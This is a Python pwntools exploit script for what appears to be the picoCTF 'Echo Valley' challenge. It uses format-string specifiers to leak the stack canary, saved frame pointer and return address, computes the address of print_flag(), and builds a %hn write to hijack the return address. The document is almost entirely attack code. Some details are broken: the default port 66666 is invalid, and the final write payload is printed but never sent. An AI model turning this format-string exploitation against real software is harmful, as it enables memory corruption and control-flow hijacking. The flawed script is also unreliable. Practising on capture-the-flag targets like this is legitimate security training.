from pwn import *
import re
import sys
import argparse

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Exploit full solution for Echo Valley")
parser.add_argument("--port", type=int, default=66666, help="Target remote port, default is 66666")
parser.add_argument("--remote", action="store_true", help="Connect to remote server if specified")
args = parser.parse_args()

# Set the architecture to amd64 for 64-bit handling
context.arch = 'amd64'
print("[DEBUG] Set architecture to amd64")

# Define offsets from the binary
MAIN_RET_OFFSET = 0x1413  # Offset to main's return address
PRINT_FLAG_OFFSET = 0x1269  # Offset to print_flag()

# Check for remote or local execution
if args.remote:
    p = remote('shape-facility.picoctf.net', args.port)
    print(f"[DEBUG] Connected to remote server at shape-facility.picoctf.net:{args.port}")
else:
    p = process('./valley')
    print("[DEBUG] Started local process './valley'")

# Read the initial prompt
prompt = p.recvline().decode()
print(f"[DEBUG] Received initial prompt: {prompt.strip()}")

# Send all leak payloads at once to gather info
p.send(b"%19$p\n%20$p\n%21$p\n")
print("[DEBUG] Sent leak payloads: %19$p\\n%20$p\\n%21$p\\n")

# Receive and parse the three responses
canary_response = p.recvline().decode()
rbp_response = p.recvline().decode()
ret_response = p.recvline().decode()

# Extract canary
match = re.search(r'You heard in the distance: (0x[0-9a-fA-F]+)', canary_response)
if match:
    canary = int(match.group(1), 16)
    print(f"[DEBUG] Leaked canary: {hex(canary)}")
else:
    print("[ERROR] Failed to parse canary")
    p.close()
    exit(1)

# Extract saved RBP
match = re.search(r'You heard in the distance: (0x[0-9a-fA-F]+)', rbp_response)
if match:
    saved_rbp = int(match.group(1), 16)
    print(f"[DEBUG] Leaked saved_rbp: {hex(saved_rbp)}")
else:
    print("[ERROR] Failed to parse saved_rbp")
    p.close()
    exit(1)

# Extract return address
match = re.search(r'You heard in the distance: (0x[0-9a-fA-F]+)', ret_response)
if match:
    ret_addr = int(match.group(1), 16)
    print(f"[DEBUG] Leaked return address: {hex(ret_addr)}")
else:
    print("[ERROR] Failed to parse return address")
    p.close()
    exit(1)

# Calculate necessary addresses
ret_addr_ptr = saved_rbp - 0x8
base_addr = ret_addr - MAIN_RET_OFFSET
print_flag_addr = base_addr + PRINT_FLAG_OFFSET
print(f"[DEBUG] Calculated ret_addr_ptr: {hex(ret_addr_ptr)}")
print(f"[DEBUG] Calculated base_addr: {hex(base_addr)}")
print(f"[DEBUG] Calculated print_flag_addr: {hex(print_flag_addr)}")

# Extract the lower 16 bits of print_flag_addr for the write
last_4_hex = print_flag_addr & 0xFFFF
decimal_value = last_4_hex
print(f"[DEBUG] Last 4 hex digits: {hex(last_4_hex)}, Decimal: {decimal_value}")

payload = (
    p64(ret_addr_ptr) * 3
)

print(f"[DEBUG] Exploit payload: {payload}")

# Send the exploit payload
p.send(payload) 

print("[DEBUG] Sent exploit payload")

next_payload = f"%{decimal_value}c%8$hn".encode()
print(f"[DEBUG] the expolit write payload you need is: {next_payload}")

# Interactive mode for further testing
p.interactive()
# Capture the final output
flag = p.recvall().decode()
print(f"[DEBUG] Final output: {flag.strip()}")